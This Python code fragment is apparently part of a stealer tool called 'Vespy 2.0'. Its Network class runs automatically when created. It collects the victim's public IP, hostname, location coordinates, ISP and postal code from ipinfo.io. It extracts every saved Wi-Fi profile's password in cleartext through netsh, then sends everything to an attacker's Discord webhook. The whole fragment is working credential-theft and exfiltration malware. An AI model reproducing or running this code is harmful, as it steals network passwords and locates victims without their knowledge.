class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        try:
            self.city = f"``{con['city']}``"
        except:
            self.city = ":x:"
        try:
            self.region = f"``{con['region']}``"
        except:
            self.region = ":x:"
        try:
            self.country = f"``{con['country']}``"
        except:
            self.country =":x:"
        try:
            self.location = f"``{con['loc']}``"
        except:
            self.location = ":x:"
        try:
            self.ISP = f"``{con['org']}``"
        except:
            self.ISP = ":x:"
        try:
            self.postal = f"``{con['postal']}``"
        except:
            self.postal = ":x:"

    def WiFi(self):
        self.IP()
        WIFIS = ""
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
                WIFIS += f"\n\n:thumbup: Wifi Network Found : ``{nets}``:man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``"
        except:pass
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}{WIFIS}")
        webhook.add_embed(embed)
        webhook.execute()